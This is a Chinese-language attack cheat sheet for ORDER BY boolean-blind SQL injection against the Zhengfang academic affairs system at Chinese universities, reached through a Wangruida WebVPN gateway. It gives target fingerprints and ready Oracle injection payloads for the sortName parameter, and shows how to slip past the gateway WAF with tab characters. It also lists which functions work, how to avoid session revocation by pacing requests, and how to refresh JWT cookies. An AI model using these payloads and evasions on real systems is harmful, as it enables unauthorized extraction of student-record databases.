# WebVPN 网瑞达层 ORDER BY 盲注 (正方教务经 WebVPN) (≤50行)

## 指纹
- 入口 `sec.<edu>.cn/webvpn/`（网瑞达 WRD 平台，base64 路径段）
- URL 结构 `/webvpn/{SEG1}/{SEG2}/{app}?vpn-12-jwglxt.<edu>.cn`
  - SEG1 = 内网IP base64；SEG2 = 多段内网IP base64 拼接
- 教务成绩 `/cjcx/cjcx_cxDgXscj.html`，参数 `queryModel.sortName`+`queryModel.sortOrder`
- 真/假判定：真→首条`劳动教育`(74) / 假→首条`中国戏曲·昆曲`(88)

## 关键差异（vs 直连正方）
- **Tab 分隔符绕过子查询 WAF**（`(\tselect\tname\tfrom\tv$database\t)` 可执行）——
  直连站点制表符失败，但 WebVPN 层(WAF在VPN网关)对 Tab 不敏感！
- 黑名单拦截的是**网关层**规则，≠ 后端 SQL 规则，层间解析不一致可绕过

## 布尔原语
```
sortName=decode(length((\tselect\tname\tfrom\tv$database\t)),8,xf,xm)  库名长度
sortName=decode(substr((\tselect\tname\tfrom\tv$database\t),N,1),chr(A),xf,xm) 逐位
```

## 函数可用矩阵（本场景实测）
- ✅ decode sign length substr chr nchr concat sysdate ora_hash abs mod
- ✅ 数据源 v$database.name / global_name / v$instance.INSTANCE_NAME
- ❌ user sys_context case when 1=1(不能写 > < >) v$version
- 字符串字面量可用（'SYS' 等）→ 可 decode(expr,'字面量',xf,xm)

## 绕坑
- **高频探测→525 会话吊销**（返回 lyuapServer 登录页）：请求间 ≥3 秒，吊销后需刷新 my_client_ticket JWT
- Cookie: `my_vpn_ticket=<固定>` + `my_client_ticket=<HS256 JWT>`，JWT exp 过期/吊销都要换
- body 用 x-www-form-urlencoded；JSON body 时后端忽略分页参数
- 判定只看 `items[0].kcmc`，不看完整响应
